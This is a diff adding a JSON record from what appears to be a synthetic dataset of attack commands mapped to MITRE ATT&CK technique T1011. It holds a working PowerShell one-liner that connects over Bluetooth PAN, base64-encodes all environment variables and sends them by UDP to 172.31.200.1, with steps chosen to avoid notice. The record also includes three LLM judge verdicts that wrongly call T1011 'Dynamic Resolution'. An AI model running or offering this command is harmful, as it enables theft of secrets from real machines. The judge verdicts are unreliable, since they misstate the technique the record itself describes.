@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.31.200.2 255.255.255.252 | Out-Null; $msg=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env: | Out-String))); $u=New-Object Net.Sockets.UdpClient; $u.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.31.200.2'),0)); $dat=[Text.Encoding]::UTF8.GetBytes($msg); $u.Send($dat,$dat.Length,'172.31.200.1',53209) | Out-Null; $u.Close()",
+  "explanation": "Sends base64-encoded environment data via UDP over a Bluetooth-only subnet, ensuring all traffic uses the alternate Bluetooth medium (T1011).",
+  "rationale_steps": [
+    "Connect to Bluetooth NAP to establish the alternate network medium.",
+    "Set a restricted IP on the Bluetooth adapter via netsh.",
+    "Bind UDP socket to the Bluetooth IP to force medium use.",
+    "Transmit to a high, uncommon UDP port to minimize attention."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-1316e4be",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax for variable assignment, pipeline operations, and method calls.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command establishes an alternative communication channel via Bluetooth PAN, it doesn't implement dynamic resolution (T1011) as it uses static IP addresses (172.31.200.1/2) rather than algorithmically determining endpoints at runtime.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:44:58.466980Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced quotes/parentheses, proper separators, and valid cmdlet/method usage.",
+        "semantic_score": 1,
+        "semantic_justification": "It conducts static UDP exfiltration over a Bluetooth PAN with hard-coded IPs (and likely needs admin for netsh) and does not exhibit any dynamic resolution behaviors like DGA, endpoint rotation, or DNS churn described by the technique.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:45:27.757465Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses correct PowerShell syntax for variable assignment, cmdlet execution, .NET method calls, external program execution, and command chaining.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command effectively sets up and uses a Bluetooth subnet for data exfiltration, it does not demonstrate 'Dynamic Resolution' (T1011) as it uses pre-determined MAC addresses and statically assigned IP addresses, lacking any algorithmic determination of endpoints.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T05:58:07.583862Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
